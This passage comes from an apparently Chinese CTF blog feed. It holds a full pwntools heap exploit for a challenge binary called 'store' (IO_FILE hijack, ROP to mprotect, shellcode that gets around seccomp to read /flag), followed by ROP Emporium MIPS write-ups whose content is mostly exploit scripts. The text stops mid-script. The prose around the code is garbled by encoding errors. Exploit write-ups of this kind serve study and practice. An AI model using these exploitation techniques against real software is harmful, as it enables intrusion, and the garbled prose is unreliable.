/><p>ä½†seccomp-toolså°†32ä½ç³»ç»Ÿè°ƒç”¨å·ä¹Ÿçœ‹æˆ64ä½çš„ï¼Œè¿™å°±å¾ˆè¿·æƒ‘äººã€‚å¯¹æ¯”32ä½çš„ç³»ç»Ÿè¡¨å°±ä¼šå‘ç°opençš„ç³»ç»Ÿè°ƒç”¨åœ¨32ä½ä¸­çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º5ï¼Œè¿™é‡Œå°±å…ˆä½¿ç”¨32ä½çš„openè°ƒç”¨å·å»æ‰“å¼€flagæ–‡ä»¶ï¼Œå†å»ç”¨64ä½çš„è¯»å†™ã€‚ç”±äº32ä½å¯„å­˜å™¨å¤§å°çš„é™åˆ¶ï¼Œç›´æ¥ä½¿ç”¨pwntoolsç”Ÿæˆçš„openç³»ç»Ÿè°ƒç”¨ä¼šå‡ºé”™ï¼Œæ‰€ä»¥å…ˆmmapä¸€æ®µä½åœ°å€å†…å­˜å†å»ä½¿ç”¨ã€‚</p><p>â€‹</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;store&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./store&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">size, content, remark</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br>    p.sendafter(<span class="hljs-string">b&#x27;Remark:&#x27;</span>, remark)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy1</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">throw</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content, remark</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br>    p.sendafter(<span class="hljs-string">b&#x27;Remark:&#x27;</span>, remark)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>buy(<span class="hljs-number">0x420</span>, <span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>buy(<span class="hljs-number">0x410</span>, <span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>throw(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak -<span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libcbase: &quot;</span> + <span class="hljs-built_in">hex</span>(libcbase))<br><br>buy1(<span class="hljs-number">0x430</span>)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;heap_addr: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_addr))<br><br>IO_list_all = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall_ret = libcbase + <span class="hljs-number">0x66229</span><br>ret = libcbase + <span class="hljs-number">0x25679</span><br>magic_gadget = libcbase + <span class="hljs-number">0x154930</span><br>mprotect = libcbase  + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>edit(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(IO_list_all - <span class="hljs-number">0x20</span>), <span class="hljs-string">b&#x27;a&#x27;</span>)<br>throw(<span class="hljs-number">1</span>)<br>buy1(<span class="hljs-number">0x430</span>)<br><br>fake_addr = heap_addr + <span class="hljs-number">0x860</span><br>fake_IO_FILE = <span class="hljs-string">b&#x27;&#x27;</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)                  <span class="hljs-comment">#_lock</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)   <span class="hljs-comment">#_wide_data</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)                              <span class="hljs-comment">#_mode</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps)         <span class="hljs-comment">#vtable</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> <br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)                              <span class="hljs-comment">#_IO_wide_data-&gt;_IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)                              <span class="hljs-comment">#_IO_wide_data-&gt;_IO_write_prt</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x138</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1b0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br><br>payload = fake_IO_FILE.ljust(<span class="hljs-number">0x1f0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += flat(<br>    p64(pop_rdi), p64(heap_addr - <span class="hljs-number">0x290</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx_r12), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>    p64(mprotect),<br>    p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br>payload += asm(shellcraft.mmap(<span class="hljs-number">0x23000</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>))<br>payload += asm(shellcraft.amd64.read(<span class="hljs-number">0</span>, <span class="hljs-number">0x23000</span>, <span class="hljs-number">0x30</span>), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>payload += asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-number">0x23000</span>, <span class="hljs-number">0</span>))<br>payload += asm(shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-number">0x23100</span>, <span class="hljs-number">0x30</span>), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>payload += asm(shellcraft.amd64.write(<span class="hljs-number">1</span>, <span class="hljs-number">0x23100</span>, <span class="hljs-number">0x30</span>), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>edit(<span class="hljs-number">1</span>, payload, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.send(<span class="hljs-string">b&#x27;/flag&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹                                          </p><p>â€‹                                                                          </p><p>å‚è€ƒï¼š<a href="https://blog.wm-team.cn/index.php/archives/34/">å¼ºç½‘æ‹Ÿæ€ 2022 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Rop Emporinm(MIPS)å‡ é“é¢˜çš„wp</title>
    <link href="/2022/11/11/Rop-Emporinm(MIPS)/"/>
    <url>/2022/11/11/Rop-Emporinm(MIPS)/</url>
    
    <content type="html"><![CDATA[<p>ä¸è·¯ç”±ç¯å¢ƒä¸åŒï¼Œè¿™é‡Œæ‰€ç”¨åˆ°çš„æ˜¯glibcï¼Œæ‰€ä»¥éœ€è¦æå‰ä¸‹è½½å¥½ç›¸åº”çš„åŠ¨æ€é“¾æ¥åº“</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> libc6-mipsel-cross<br></code></pre></td></tr></table></figure><p>â€‹                       </p><p>MIPSåŠ¨æ€åº“ä¸­çš„å¤–éƒ¨ç¬¦å·è°ƒç”¨ï¼Œæ˜¯ä¾èµ–<code>.got</code>æ®µå’Œ<code>.MIPS.stubs</code>æ®µæ¥å…±åŒå®ç°çš„ï¼Œ<code>.MIPS.stubs</code>ç±»ä¼¼äºx86çš„<code>.plt</code>ã€‚</p><h4 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1.ret2win"></a>1.ret2win</h4><p>ç›´æ¥æ‰¾åˆ°å‡½æ•°ret2winåœ°å€å»æ‰§è¡Œ system(â€œ&#x2F;bin&#x2F;cat flag.txtâ€)ï¼Œè¾“å‡ºflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ret2win_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./ret2win_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(<span class="hljs-number">0x400a00</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>) <br></code></pre></td></tr></table></figure><h4 id="2-split"><a href="#2-split" class="headerlink" title="2.split"></a>2.split</h4><p>åˆ©ç”¨systemçš„åœ°å€å’Œflag.txtå­—ç¬¦ä¸²çš„åœ°å€ï¼Œè¾“å‡ºflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;split_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./split_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget = <span class="hljs-number">0x400a20</span><br><span class="hljs-comment">#sys_addr = 0x400b70</span><br>sys_addr = <span class="hljs-number">0x4009ec</span><br>cat_flag = <span class="hljs-number">0x411010</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(sys_addr) +p32(cat_flag)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&#x27;</span>)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="3-callme"><a href="#3-callme" class="headerlink" title="3.callme"></a>3.callme</h4><p>è¿è¡Œcallme1ï¼Œcallme2ï¼Œcallme3å‡½æ•°ï¼Œå¹¶ä¼ é€’æ­£ç¡®çš„å‚æ•°ï¼Œåœ¨ifè¯­å¥ä¸­æ‰§è¡Œæ­£ç¡®çš„åˆ†æ”¯ï¼Œæ‰ä¼šå°†flagè¾“å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;callme_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./callme_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>key1 = <span class="hljs-number">0xDEADBEEF</span><br>key2 = <span class="hljs-number">0xCAFEBABE</span><br>key3 = <span class="hljs-number">0xD00DF00D</span><br><br>gadget = <span class="hljs-number">0x400bb0</span><br>callme_one = <span class="hljs-number">0x400d20</span><br>callme_two = <span class="hljs-number">0x400d80</span><br>callme_three = <span class="hljs-number">0x400d10</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_one) + p32(key3) + p32(key2) + p32(key1)<br>payload += p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_two) + p32(key3) + p32(key2) + p32(key1)<br>payload += p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_three) + p32(key3) + p32(key2) + p32(key1)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="4-write4"><a href="#4-write4" class="headerlink" title="4.write4"></a>4.write4</h4><p>é€šè¿‡æ‰§è¡Œprint_fileå‡½æ•°ï¼Œå°†print_fileå‡½æ•°å‚æ•°flag.txtå†™åˆ°dataæ®µæˆ–è€…bssæ®µä¸Šï¼Œå¯è¾“å‡ºflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;write4_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&quot;qemu-mipsel&quot;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&quot;write4_mipsel&quot;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget = <span class="hljs-number">0x400930</span><br>print_file = <span class="hljs-number">0x400a90</span><br>pwnme = <span class="hljs-number">0x400a70</span><br>buf = <span class="hljs-number">0x411000</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + <span class="hljs-string">b&#x27;flag&#x27;</span> + p32(buf) + p32(pwnme)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + <span class="hljs-string">b&#x27;.txt&#x27;</span> + p32(buf + <span class="hljs-number">4</span>) + p32(pwnme)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget + <span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(print_file) + p32(buf)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5.badchars"></a>5.badchars</h4><p>ä¸write4ä¸€æ ·ï¼Œé€šè¿‡æ‰§è¡Œprint_fileå‡½æ•°ï¼Œå°†print_fileå‡½æ•°å‚æ•°flag.txtå†™åˆ°dataæ®µæˆ–è€…bssæ®µä¸Šï¼Œå¯è¾“å‡ºflag</p><p>ä½†ä¼šå¯¹å­—ç¬¦ä¸²åˆ¤æ–­ï¼Œå¦‚æœå­—ç¬¦ä¸²ä¸­â€™æœ‰xâ€™ï¼Œâ€™gâ€™ï¼Œâ€™aâ€™ï¼Œâ€™.â€™è¿™äº›å­—ç¬¦å°±ä¼šèµ‹å€¼ä¸º-21ï¼Œå¯ä»¥é€šè¿‡xoråŠ å¯†ç»•è¿‡åˆ¤æ–­ï¼Œ</p><p>ç„¶åxorè¿˜åŸã€‚å’Œx86ä¸åŒçš„æ˜¯MIPSéœ€è¦åœ°å€å¯¹é½æ‰èƒ½æ­£å¸¸å–å‡ºå­—ç¬¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;badchars_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./badchars_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x400930</span><br>gadget2 = <span class="hljs-number">0x400948</span><br>gadget3 = <span class="hljs-number">0x400968</span><br>buf = <span class="hljs-number">0x411000</span><br><br>badchars = [<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>]<br>new_flag = <span class="hljs-string">&quot;&quot;</span><br>xor_byte = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    output = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;flag.txt&quot;</span>:<br>        c = <span class="hljs-built_in">ord</span>(i)  ^  xor_byte<br>        c =  <span class="hljs-built_in">chr</span>(c)<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> badchars:<br>            xor_byte += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            output += c<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(output) == <span class="hljs-number">8</span>:<br>        new_flag = output<br>        <span class="hljs-keyword">break</span><br>new_flag = <span class="hljs-built_in">bytes</span>(new_flag.encode())<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(gadget1) + p32(<span class="hljs-number">0</span>) + new_flag[:<span class="hljs-number">4</span>] + p32(buf) + p32(gadget1)<br>payload += p32(<span class="hljs-number">0</span>) + new_flag[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>] + p32(buf + <span class="hljs-number">4</span>) + p32(gadget2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    xor_b = xor_byte &lt;&lt; (i * <span class="hljs-number">8</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32(buf) + p32(xor_b)  + p32(gadget2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    xor_b = xor_byte &lt;&lt; (i * <span class="hljs-number">8</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32(buf + <span class="hljs-number">4</span>) + p32(xor_b)  + p32(gadget2)<br>payload += p32(<span class="hljs-number">0</span>) + p32(buf + <span class="hljs-number">4</span>) + p32(xor_byte &lt;&lt; <span class="hljs-number">24</span>)  + p32(gadget3) <br>payload += p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x400ab0</span>) + p32(buf)<br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>) <br></code></pre></td></tr></table></figure><h4 id="7-pivot"><a href="#7-pivot" class="headerlink" title="7.pivot"></a>7.pivot</h4><p>æº¢å‡ºååˆ©ç”¨æ ˆè¿ç§»ä¿®æ”¹foothold_functionå‡½æ•°gotè¡¨çš„åœ°å€ä¸ºret2winçš„åœ°å€å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pivot_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span 